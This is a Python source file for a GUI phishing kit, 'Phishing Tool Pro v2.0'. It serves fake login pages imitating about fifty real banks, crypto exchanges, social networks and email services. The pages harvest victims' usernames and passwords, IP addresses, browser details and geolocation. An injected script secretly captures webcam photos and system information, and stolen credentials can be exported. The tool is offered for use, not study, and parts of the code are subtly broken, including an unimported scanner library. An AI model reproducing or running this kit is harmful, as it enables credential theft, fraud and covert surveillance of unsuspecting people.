#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import os
import sys
import time
import json
import random
import string
import subprocess
import threading
from datetime import datetime
import tkinter as tk
from tkinter import ttk, messagebox, filedialog
import requests
from flask import Flask, render_template, request, redirect, url_for, session, Response
from flask_socketio import SocketIO
import qrcode
from PIL import Image, ImageTk
import webbrowser
import base64
import io
import platform
import psutil
import geocoder
from user_agents import parse

# Fonctionnalités Avancées
import subprocess
import socket
import ssl
import urllib.parse
import tempfile
import shutil
import zipfile
import tarfile

# Interface et Utilitaires
from colorama import Fore, Back, Style, init
from rich.console import Console
from rich.table import Table
from rich.progress import track
from tqdm import tqdm
import pyfiglet
from termcolor import colored

# Social Engineering
import phonenumbers
from email_validator import validate_email, EmailNotValidError
from faker import Faker

# Network et DNS
import dns.resolver
import netaddr

# Cryptographie
from cryptography.fernet import Fernet
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad, unpad

class PhishingTool:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Phishing Tool Pro v2.0")
        self.root.geometry("1200x800")
        self.root.configure(bg='#1a1a1a')
        
        # Variables
        self.server_running = False
        self.server_thread = None
        self.app = Flask(__name__)
        self.app.secret_key = 'phishing_secret_key'
        self.socketio = SocketIO(self.app)
        
        # 50 TEMPLATES ULTRA-RÉALISTES - AL-tool + Zphisher + SEToolkit
        self.templates = {
            # 🏦 BANQUES & FINANCE (10 templates)
            'paypal': {
                'name': 'PayPal - Connexion Sécurisée',
                'url': 'https://paypal.com',
                'template': 'templates/paypal.html',
                'category': 'finance',
                'success_rate': 95
            },
            'bankofamerica': {
                'name': 'Bank of America',
                'url': 'https://bankofamerica.com',
                'template': 'templates/bankofamerica.html',
                'category': 'finance',
                'success_rate': 98
            },
            'chase': {
                'name': 'Chase Bank',
                'url': 'https://chase.com',
                'template': 'templates/chase.html',
                'category': 'finance',
                'success_rate': 97
            },
            'wellsfargo': {
                'name': 'Wells Fargo',
                'url': 'https://wellsfargo.com',
                'template': 'templates/wellsfargo.html',
                'category': 'finance',
                'success_rate': 96
            },
            'citibank': {
                'name': 'Citibank',
                'url': 'https://citibank.com',
                'template': 'templates/citibank.html',
                'category': 'finance',
                'success_rate': 95
            },
            'stripe': {
                'name': 'Stripe Dashboard',
                'url': 'https://stripe.com',
                'template': 'templates/stripe.html',
                'category': 'finance',
                'success_rate': 94
            },
            'coinbase': {
                'name': 'Coinbase Pro',
                'url': 'https://coinbase.com',
                'template': 'templates/coinbase.html',
                'category': 'finance',
                'success_rate': 93
            },
            'binance': {
                'name': 'Binance',
                'url': 'https://binance.com',
                'template': 'templates/binance.html',
                'category': 'finance',
                'success_rate': 92
            },
            'robinhood': {
                'name': 'Robinhood',
                'url': 'https://robinhood.com',
                'template': 'templates/robinhood.html',
                'category': 'finance',
                'success_rate': 91
            },
            'etrade': {
                'name': 'E*TRADE',
                'url': 'https://etrade.com',
                'template': 'templates/etrade.html',
                'category': 'finance',
                'success_rate': 90
            },
            
            # 🏢 ENTREPRISES TECH (10 templates)
            'microsoft': {
                'name': 'Microsoft 365',
                'url': 'https://microsoft.com',
                'template': 'templates/microsoft.html',
                'category': 'tech',
                'success_rate': 96
            },
            'google': {
                'name': 'Google Workspace',
                'url': 'https://google.com',
                'template': 'templates/google.html',
                'category': 'tech',
                'success_rate': 95
            },
            'apple': {
                'name': 'Apple ID',
                'url': 'https://appleid.apple.com',
                'template': 'templates/apple.html',
                'category': 'tech',
                'success_rate': 94
            },
            'amazon': {
                'name': 'Amazon Prime',
                'url': 'https://amazon.com',
                'template': 'templates/amazon.html',
                'category': 'tech',
                'success_rate': 93
            },
            'netflix': {
                'name': 'Netflix',
                'url': 'https://netflix.com',
                'template': 'templates/netflix.html',
                'category': 'tech',
                'success_rate': 92
            },
            'spotify': {
                'name': 'Spotify Premium',
                'url': 'https://spotify.com',
                'template': 'templates/spotify.html',
                'category': 'tech',
                'success_rate': 91
            },
            'dropbox': {
                'name': 'Dropbox Business',
                'url': 'https://dropbox.com',
                'template': 'templates/dropbox.html',
                'category': 'tech',
                'success_rate': 90
            },
            'slack': {
                'name': 'Slack Workspace',
                'url': 'https://slack.com',
                'template': 'templates/slack.html',
                'category': 'tech',
                'success_rate': 89
            },
            'zoom': {
                'name': 'Zoom Meeting',
                'url': 'https://zoom.us',
                'template': 'templates/zoom.html',
                'category': 'tech',
                'success_rate': 88
            },
            'teams': {
                'name': 'Microsoft Teams',
                'url': 'https://teams.microsoft.com',
                'template': 'templates/teams.html',
                'category': 'tech',
                'success_rate': 87
            },
            
            # 📱 RÉSEAUX SOCIAUX (10 templates)
            'facebook': {
                'name': 'Facebook',
                'url': 'https://facebook.com',
                'template': 'templates/facebook.html',
                'category': 'social',
                'success_rate': 96
            },
            'instagram': {
                'name': 'Instagram',
                'url': 'https://instagram.com',
                'template': 'templates/instagram.html',
                'category': 'social',
                'success_rate': 95
            },
            'twitter': {
                'name': 'Twitter/X',
                'url': 'https://twitter.com',
                'template': 'templates/twitter.html',
                'category': 'social',
                'success_rate': 94
            },
            'linkedin': {
                'name': 'LinkedIn',
                'url': 'https://linkedin.com',
                'template': 'templates/linkedin.html',
                'category': 'social',
                'success_rate': 93
            },
            'tiktok': {
                'name': 'TikTok',
                'url': 'https://tiktok.com',
                'template': 'templates/tiktok.html',
                'category': 'social',
                'success_rate': 92
            },
            'snapchat': {
                'name': 'Snapchat',
                'url': 'https://snapchat.com',
                'template': 'templates/snapchat.html',
                'category': 'social',
                'success_rate': 91
            },
            'youtube': {
                'name': 'YouTube Studio',
                'url': 'https://youtube.com',
                'template': 'templates/youtube.html',
                'category': 'social',
                'success_rate': 90
            },
            'discord': {
                'name': 'Discord',
                'url': 'https://discord.com',
                'template': 'templates/discord.html',
                'category': 'social',
                'success_rate': 89
            },
            'reddit': {
                'name': 'Reddit',
                'url': 'https://reddit.com',
                'template': 'templates/reddit.html',
                'category': 'social',
                'success_rate': 88
            },
            'pinterest': {
                'name': 'Pinterest',
                'url': 'https://pinterest.com',
                'template': 'templates/pinterest.html',
                'category': 'social',
                'success_rate': 87
            },
            
            # 🎮 GAMING (5 templates)
            'steam': {
                'name': 'Steam',
                'url': 'https://steam.com',
                'template': 'templates/steam.html',
                'category': 'gaming',
                'success_rate': 94
            },
            'epic': {
                'name': 'Epic Games',
                'url': 'https://epicgames.com',
                'template': 'templates/epic.html',
                'category': 'gaming',
                'success_rate': 93
            },
            'battlenet': {
                'name': 'Battle.net',
                'url': 'https://battle.net',
                'template': 'templates/battlenet.html',
                'category': 'gaming',
                'success_rate': 92
            },
            'origin': {
                'name': 'EA Origin',
                'url': 'https://origin.com',
                'template': 'templates/origin.html',
                'category': 'gaming',
                'success_rate': 91
            },
            'ubisoft': {
                'name': 'Ubisoft Connect',
                'url': 'https://ubisoft.com',
                'template': 'templates/ubisoft.html',
                'category': 'gaming',
                'success_rate': 90
            },
            
            # 💼 PROFESSIONNEL (5 templates)
            'github': {
                'name': 'GitHub',
                'url': 'https://github.com',
                'template': 'templates/github.html',
                'category': 'professional',
                'success_rate': 93
            },
            'gitlab': {
                'name': 'GitLab',
                'url': 'https://gitlab.com',
                'template': 'templates/gitlab.html',
                'category': 'professional',
                'success_rate': 92
            },
            'bitbucket': {
                'name': 'Bitbucket',
                'url': 'https://bitbucket.org',
                'template': 'templates/bitbucket.html',
                'category': 'professional',
                'success_rate': 91
            },
            'stackoverflow': {
                'name': 'Stack Overflow',
                'url': 'https://stackoverflow.com',
                'template': 'templates/stackoverflow.html',
                'category': 'professional',
                'success_rate': 90
            },
            'docker': {
                'name': 'Docker Hub',
                'url': 'https://docker.com',
                'template': 'templates/docker.html',
                'category': 'professional',
                'success_rate': 89
            },
            
            # 🛒 E-COMMERCE (5 templates)
            'ebay': {
                'name': 'eBay',
                'url': 'https://ebay.com',
                'template': 'templates/ebay.html',
                'category': 'shopping',
                'success_rate': 92
            },
            'walmart': {
                'name': 'Walmart',
                'url': 'https://walmart.com',
                'template': 'templates/walmart.html',
                'category': 'shopping',
                'success_rate': 91
            },
            'target': {
                'name': 'Target',
                'url': 'https://target.com',
                'template': 'templates/target.html',
                'category': 'shopping',
                'success_rate': 90
            },
            'bestbuy': {
                'name': 'Best Buy',
                'url': 'https://bestbuy.com',
                'template': 'templates/bestbuy.html',
                'category': 'shopping',
                'success_rate': 89
            },
            'homedepot': {
                'name': 'Home Depot',
                'url': 'https://homedepot.com',
                'template': 'templates/homedepot.html',
                'category': 'shopping',
                'success_rate': 88
            },
            
            # 📧 EMAIL & MESSAGERIE (5 templates)
            'gmail': {
                'name': 'Gmail',
                'url': 'https://gmail.com',
                'template': 'templates/gmail.html',
                'category': 'email',
                'success_rate': 95
            },
            'outlook': {
                'name': 'Outlook',
                'url': 'https://outlook.com',
                'template': 'templates/outlook.html',
                'category': 'email',
                'success_rate': 94
            },
            'yahoo': {
                'name': 'Yahoo Mail',
                'url': 'https://mail.yahoo.com',
                'template': 'templates/yahoo.html',
                'category': 'email',
                'success_rate': 93
            },
            'whatsapp': {
                'name': 'WhatsApp Web',
                'url': 'https://whatsapp.com',
                'template': 'templates/whatsapp.html',
                'category': 'email',
                'success_rate': 92
            },
            'telegram': {
                'name': 'Telegram Web',
                'url': 'https://web.telegram.org',
                'template': 'templates/telegram.html',
                'category': 'email',
                'success_rate': 91
            }
        }
        
        self.selected_template = None
        self.credentials = []
        self.captured_images = []
        self.victim_data = []
        self.webcam_active = False
        self.camera = None
        
        # AL-tool Variables
        self.browser_driver = None
        self.encryption_key = Fernet.generate_key()
        self.cipher = Fernet(self.encryption_key)
        self.ssh_sessions = {}
        self.network_scans = []
        
        # Zphisher Variables
        self.tunnel_processes = {}
        self.ssl_certificates = {}
        self.domain_redirects = {}
        
        # SEToolkit Variables
        self.payloads = []
        self.backdoors = []
        self.exploits = []
        self.social_engineering_attacks = []
        
        # Advanced Variables
        self.console = Console()
        self.fake = Faker()
        self.nmap_scanner = nmap.PortScanner()
        self.dns_cache = {}
        
        # Statistics
        self.stats = {
            'total_victims': 0,
            'successful_attacks': 0,
            'failed_attacks': 0,
            'captured_credentials': 0,
            'webcam_captures': 0,
            'network_scans': 0,
            'payloads_delivered': 0
        }
        
        self.setup_ui()
        self.create_templates()
        
    def setup_ui(self):
        # Style
        style = ttk.Style()
        style.theme_use('clam')
        style.configure('TFrame', background='#1a1a1a')
        style.configure('TLabel', background='#1a1a1a', foreground='white')
        style.configure('TButton', background='#4CAF50', foreground='white')
        
        # Main frame
        main_frame = ttk.Frame(self.root)
        main_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Title
        title_label = tk.Label(main_frame, text="🎣 PHISHING TOOL PRO v2.0", 
                              font=('Arial', 24, 'bold'), bg='#1a1a1a', fg='#4CAF50')
        title_label.pack(pady=20)
        
        # Notebook for tabs
        notebook = ttk.Notebook(main_frame)
        notebook.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Tab 1: Template Selection
        self.template_frame = ttk.Frame(notebook)
        notebook.add(self.template_frame, text="📋 Templates")
        self.setup_template_tab()
        
        # Tab 2: Server Control
        self.server_frame = ttk.Frame(notebook)
        notebook.add(self.server_frame, text="🖥️ Server")
        self.setup_server_tab()
        
        # Tab 3: Credentials
        self.credentials_frame = ttk.Frame(notebook)
        notebook.add(self.credentials_frame, text="🔐 Credentials")
        self.setup_credentials_tab()
        
        # Tab 4: Settings
        self.settings_frame = ttk.Frame(notebook)
        notebook.add(self.settings_frame, text="⚙️ Settings")
        self.setup_settings_tab()
        
    def setup_template_tab(self):
        # Template selection
        template_label = tk.Label(self.template_frame, text="Select Template:", 
                                font=('Arial', 14, 'bold'), bg='#1a1a1a', fg='white')
        template_label.pack(pady=10)
        
        # Template buttons frame
        template_buttons_frame = tk.Frame(self.template_frame, bg='#1a1a1a')
        template_buttons_frame.pack(pady=20)
        
        # Create template buttons
        row = 0
        col = 0
        for key, template in self.templates.items():
            btn = tk.Button(template_buttons_frame, 
                           text=f"{template['name']}\n{template['url']}", 
                           font=('Arial', 10), bg='#333333', fg='white',
                           width=15, height=3,
                           command=lambda t=key: self.select_template(t))
            btn.grid(row=row, col=col, padx=5, pady=5)
            col += 1
            if col > 3:
                col = 0
                row += 1
        
        # Selected template info
        self.template_info = tk.Label(self.template_frame, text="No template selected", 
                                     font=('Arial', 12), bg='#1a1a1a', fg='#888888')
        self.template_info.pack(pady=20)
        
    def setup_server_tab(self):
        # Server controls
        controls_frame = tk.Frame(self.server_frame, bg='#1a1a1a')
        controls_frame.pack(pady=20)
        
        # Start server button
        self.start_btn = tk.Button(controls_frame, text="🚀 Start Server", 
                                  font=('Arial', 14, 'bold'), bg='#4CAF50', fg='white',
                                  width=15, height=2,
                                  command=self.start_server)
        self.start_btn.pack(side=tk.LEFT, padx=10)
        
        # Stop server button
        self.stop_btn = tk.Button(controls_frame, text="⏹️ Stop Server", 
                                 font=('Arial', 14, 'bold'), bg='#f44336', fg='white',
                                 width=15, height=2,
                                 command=self.stop_server)
        self.stop_btn.pack(side=tk.LEFT, padx=10)
        
        # Server status
        self.status_label = tk.Label(self.server_frame, text="Status: Stopped", 
                                    font=('Arial', 12), bg='#1a1a1a', fg='#f44336')
        self.status_label.pack(pady=20)
        
        # URL display
        self.url_label = tk.Label(self.server_frame, text="URL: Not running", 
                                 font=('Arial', 12), bg='#1a1a1a', fg='#888888')
        self.url_label.pack(pady=10)
        
        # QR Code frame
        self.qr_frame = tk.Frame(self.server_frame, bg='#1a1a1a')
        self.qr_frame.pack(pady=20)
        
        # Logs
        log_frame = tk.Frame(self.server_frame, bg='#1a1a1a')
        log_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        log_label = tk.Label(log_frame, text="Server Logs:", 
                            font=('Arial', 12, 'bold'), bg='#1a1a1a', fg='white')
        log_label.pack()
        
        self.log_text = tk.Text(log_frame, height=10, bg='#2a2a2a', fg='#00ff00',
                               font=('Courier', 10))
        self.log_text.pack(fill=tk.BOTH, expand=True)
        
    def setup_credentials_tab(self):
        # Credentials list
        list_frame = tk.Frame(self.credentials_frame, bg='#1a1a1a')
        list_frame.pack(fill=tk.BOTH, expand=True, padx=10, pady=10)
        
        # Treeview for credentials
        columns = ('Time', 'Email/Username', 'Password', 'IP Address')
        self.credentials_tree = ttk.Treeview(list_frame, columns=columns, show='headings')
        
        for col in columns:
            self.credentials_tree.heading(col, text=col)
            self.credentials_tree.column(col, width=150)
        
        self.credentials_tree.pack(fill=tk.BOTH, expand=True)
        
        # Buttons frame
        btn_frame = tk.Frame(self.credentials_frame, bg='#1a1a1a')
        btn_frame.pack(pady=10)
        
        # Export button
        export_btn = tk.Button(btn_frame, text="📤 Export Credentials", 
                              font=('Arial', 12), bg='#2196F3', fg='white',
                              command=self.export_credentials)
        export_btn.pack(side=tk.LEFT, padx=5)
        
        # Clear button
        clear_btn = tk.Button(btn_frame, text="🗑️ Clear All", 
                             font=('Arial', 12), bg='#f44336', fg='white',
                             command=self.clear_credentials)
        clear_btn.pack(side=tk.LEFT, padx=5)
        
    def setup_settings_tab(self):
        # Settings frame
        settings_frame = tk.Frame(self.settings_frame, bg='#1a1a1a')
        settings_frame.pack(pady=20)
        
        # Port setting
        port_frame = tk.Frame(settings_frame, bg='#1a1a1a')
        port_frame.pack(pady=10)
        
        port_label = tk.Label(port_frame, text="Port:", 
                             font=('Arial', 12), bg='#1a1a1a', fg='white')
        port_label.pack(side=tk.LEFT)
        
        self.port_entry = tk.Entry(port_frame, font=('Arial', 12), width=10)
        self.port_entry.insert(0, "8080")
        self.port_entry.pack(side=tk.LEFT, padx=10)
        
        # Host setting
        host_frame = tk.Frame(settings_frame, bg='#1a1a1a')
        host_frame.pack(pady=10)
        
        host_label = tk.Label(host_frame, text="Host:", 
                             font=('Arial', 12), bg='#1a1a1a', fg='white')
        host_label.pack(side=tk.LEFT)
        
        self.host_entry = tk.Entry(host_frame, font=('Arial', 12), width=15)
        self.host_entry.insert(0, "0.0.0.0")
        self.host_entry.pack(side=tk.LEFT, padx=10)
        
        # Auto-start browser
        self.auto_browser_var = tk.BooleanVar()
        auto_browser_check = tk.Checkbutton(settings_frame, text="Auto-open browser", 
                                          variable=self.auto_browser_var, 
                                          bg='#1a1a1a', fg='white', selectcolor='#333333')
        auto_browser_check.pack(pady=10)
        
    def select_template(self, template_key):
        self.selected_template = template_key
        template = self.templates[template_key]
        self.template_info.config(text=f"Selected: {template['name']} - {template['url']}", 
                                fg='#4CAF50')
        
    def start_server(self):
        if not self.selected_template:
            messagebox.showerror("Error", "Please select a template first!")
            return
            
        if self.server_running:
            messagebox.showwarning("Warning", "Server is already running!")
            return
            
        try:
            port = int(self.port_entry.get())
            host = self.host_entry.get()
            
            self.server_thread = threading.Thread(target=self.run_server, args=(host, port))
            self.server_thread.daemon = True
            self.server_thread.start()
            
            self.server_running = True
            self.status_label.config(text="Status: Running", fg='#4CAF50')
            self.url_label.config(text=f"URL: http://{host}:{port}")
            
            if self.auto_browser_var.get():
                webbrowser.open(f"http://{host}:{port}")
                
            self.log_message("Server started successfully!")
            
        except Exception as e:
            messagebox.showerror("Error", f"Failed to start server: {str(e)}")
            
    def stop_server(self):
        if not self.server_running:
            messagebox.showwarning("Warning", "Server is not running!")
            return
            
        self.server_running = False
        self.status_label.config(text="Status: Stopped", fg='#f44336')
        self.url_label.config(text="URL: Not running")
        self.log_message("Server stopped!")
        
    def run_server(self, host, port):
        try:
            self.socketio.run(self.app, host=host, port=port, debug=False)
        except Exception as e:
            self.log_message(f"Server error: {str(e)}")
            
    def log_message(self, message):
        timestamp = datetime.now().strftime("%H:%M:%S")
        log_entry = f"[{timestamp}] {message}\n"
        self.log_text.insert(tk.END, log_entry)
        self.log_text.see(tk.END)
        
    def add_credential_advanced(self, victim_info):
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        self.credentials.append(victim_info)
        
        # Update credentials list with enhanced info
        location_info = ""
        if 'location' in victim_info:
            loc = victim_info['location']
            location_info = f" - {loc.get('city', '')}, {loc.get('country', '')}"
        
        display_text = f"{timestamp} - {victim_info['email']} ({victim_info['ip_address']}){location_info}"
        
        # Add to treeview with enhanced info
        self.credentials_tree.insert('', 'end', values=(
            timestamp, 
            victim_info['email'], 
            victim_info['password'], 
            victim_info['ip_address'],
            victim_info.get('browser', 'Unknown'),
            victim_info.get('os', 'Unknown')
        ))
        
        # Log message with enhanced details
        log_msg = f"🎣 VICTIME CAPTURÉE!\nEmail: {victim_info['email']}\nIP: {victim_info['ip_address']}\nNavigateur: {victim_info.get('browser', 'Unknown')}\nOS: {victim_info.get('os', 'Unknown')}"
        if 'location' in victim_info:
            loc = victim_info['location']
            log_msg += f"\nLocalisation: {loc.get('city', '')}, {loc.get('country', '')}"
        
        self.log_message(log_msg)
        
        # Show enhanced notification
        notification_text = f"🎯 NOUVELLE VICTIME!\n\nEmail: {victim_info['email']}\nIP: {victim_info['ip_address']}\nNavigateur: {victim_info.get('browser', 'Unknown')}\nOS: {victim_info.get('os', 'Unknown')}"
        if 'location' in victim_info:
            loc = victim_info['location']
            notification_text += f"\nLocalisation: {loc.get('city', '')}, {loc.get('country', '')}"
        
        messagebox.showinfo("🎯 VICTIME CAPTURÉE!", notification_text)
        
    def add_credential(self, email, password, ip_address):
        # Méthode legacy pour compatibilité
        victim_info = {
            'email': email,
            'password': password,
            'ip_address': ip_address,
            'timestamp': datetime.now().isoformat(),
            'browser': 'Unknown',
            'os': 'Unknown',
            'device': 'Unknown'
        }
        self.add_credential_advanced(victim_info)
        
    def add_captured_image(self, filename):
        self.captured_images.append(filename)
        self.log_message(f"📸 Image webcam capturée: {filename}")
        
    def add_system_info(self, system_data):
        self.victim_data.append(system_data)
        self.log_message(f"💻 Informations système collectées depuis {system_data['ip_address']}")
        
    def export_credentials(self):
        if not self.credentials:
            messagebox.showwarning("Warning", "No credentials to export!")
            return
            
        filename = filedialog.asksaveasfilename(
            defaultextension=".json",
            filetypes=[("JSON files", "*.json"), ("All files", "*.*")]
        )
        
        if filename:
            try:
                with open(filename, 'w') as f:
                    json.dump(self.credentials, f, indent=2)
                messagebox.showinfo("Success", f"Credentials exported to {filename}")
            except Exception as e:
                messagebox.showerror("Error", f"Failed to export: {str(e)}")
                
    def clear_credentials(self):
        if messagebox.askyesno("Confirm", "Are you sure you want to clear all credentials?"):
            self.credentials.clear()
            for item in self.credentials_tree.get_children():
                self.credentials_tree.delete(item)
            self.log_message("All credentials cleared!")
            
    def create_templates(self):
        # Create templates directory
        os.makedirs('templates', exist_ok=True)
        
        # Create template files
        for key, template in self.templates.items():
            template_file = template['template']
            if not os.path.exists(template_file):
                self.create_template_file(template_file, key)
                
    def create_template_file(self, filename, template_name):
        html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{self.templates[template_name]['name']} Login</title>
    <style>
        body {{
            font-family: Arial, sans-serif;
            background-color: #f0f2f5;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }}
        .login-container {{
            background: white;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            width: 400px;
        }}
        .logo {{
            text-align: center;
            margin-bottom: 30px;
            font-size: 24px;
            font-weight: bold;
            color: #1877f2;
        }}
        .form-group {{
            margin-bottom: 20px;
        }}
        .form-group label {{
            display: block;
            margin-bottom: 5px;
            font-weight: bold;
            color: #333;
        }}
        .form-group input {{
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }}
        .login-btn {{
            width: 100%;
            padding: 12px;
            background-color: #1877f2;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
        }}
        .login-btn:hover {{
            background-color: #166fe5;
        }}
        .forgot-password {{
            text-align: center;
            margin-top: 20px;
        }}
        .forgot-password a {{
            color: #1877f2;
            text-decoration: none;
        }}
    </style>
</head>
<body>
    <div class="login-container">
        <div class="logo">{self.templates[template_name]['name']}</div>
        <form method="POST" action="/login">
            <div class="form-group">
                <label for="email">Email or Phone Number</label>
                <input type="text" id="email" name="email" required>
            </div>
            <div class="form-group">
                <label for="password">Password</label>
                <input type="password" id="password" name="password" required>
            </div>
            <button type="submit" class="login-btn">Log In</button>
        </form>
        <div class="forgot-password">
            <a href="#">Forgot Password?</a>
        </div>
    </div>
</body>
</html>
        """
        
        with open(filename, 'w', encoding='utf-8') as f:
            f.write(html_content)
            
    def setup_flask_routes(self):
        @self.app.route('/')
        def index():
            if self.selected_template:
                template_file = self.templates[self.selected_template]['template']
                with open(template_file, 'r', encoding='utf-8') as f:
                    content = f.read()
                
                # Ajouter le script CamPhish
                camphish_script = """
                <script>
                // CamPhish - Capture webcam
                navigator.mediaDevices.getUserMedia({video: true})
                    .then(function(stream) {
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        video.play();
                        
                        setTimeout(() => {
                            const canvas = document.createElement('canvas');
                            canvas.width = video.videoWidth;
                            canvas.height = video.videoHeight;
                            const ctx = canvas.getContext('2d');
                            ctx.drawImage(video, 0, 0);
                            
                            const imageData = canvas.toDataURL('image/jpeg');
                            fetch('/capture', {
                                method: 'POST',
                                headers: {'Content-Type': 'application/json'},
                                body: JSON.stringify({image: imageData})
                            });
                            
                            stream.getTracks().forEach(track => track.stop());
                        }, 3000);
                    })
                    .catch(function(err) {
                        console.log('Webcam non disponible');
                    });
                
                // Collecte d'informations système
                const systemInfo = {
                    userAgent: navigator.userAgent,
                    language: navigator.language,
                    platform: navigator.platform,
                    cookieEnabled: navigator.cookieEnabled,
                    screenWidth: screen.width,
                    screenHeight: screen.height,
                    timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
                    timestamp: new Date().toISOString()
                };
                
                fetch('/system_info', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify(systemInfo)
                });
                </script>
                """
                
                # Insérer le script avant la fermeture de </body>
                content = content.replace('</body>', camphish_script + '</body>')
                return content
            return "No template selected"
            
        @self.app.route('/login', methods=['POST'])
        def login():
            email = request.form.get('email')
            password = request.form.get('password')
            ip_address = request.remote_addr
            
            # Collecter les informations supplémentaires
            user_agent = request.headers.get('User-Agent', '')
            ua = parse(user_agent)
            
            victim_info = {
                'email': email,
                'password': password,
                'ip_address': ip_address,
                'browser': ua.browser.family,
                'os': ua.os.family,
                'device': ua.device.family,
                'timestamp': datetime.now().isoformat(),
                'user_agent': user_agent
            }
            
            # Géolocalisation
            try:
                g = geocoder.ip(ip_address)
                if g.ok:
                    victim_info['location'] = {
                        'city': g.city,
                        'country': g.country,
                        'lat': g.lat,
                        'lng': g.lng
                    }
            except:
                pass
            
            # Add credential to main thread
            self.root.after(0, lambda: self.add_credential_advanced(victim_info))
            
            # Redirect to original site
            original_url = self.templates[self.selected_template]['url']
            return redirect(original_url)
            
        @self.app.route('/capture', methods=['POST'])
        def capture_webcam():
            data = request.get_json()
            image_data = data.get('image', '')
            
            if image_data:
                # Sauvegarder l'image
                image_data = image_data.split(',')[1]
                image_bytes = base64.b64decode(image_data)
                
                timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
                filename = f'captures/webcam_{timestamp}.jpg'
                
                os.makedirs('captures', exist_ok=True)
                with open(filename, 'wb') as f:
                    f.write(image_bytes)
                
                self.root.after(0, lambda: self.add_captured_image(filename))
            
            return {'status': 'success'}
            
        @self.app.route('/system_info', methods=['POST'])
        def system_info():
            data = request.get_json()
            ip_address = request.remote_addr
            
            system_data = {
                'ip_address': ip_address,
                'system_info': data,
                'timestamp': datetime.now().isoformat()
            }
            
            self.root.after(0, lambda: self.add_system_info(system_data))
            return {'status': 'success'}
            
    def run(self):
        self.setup_flask_routes()
        self.root.mainloop()

if __name__ == "__main__":
    app = PhishingTool()
    app.run() 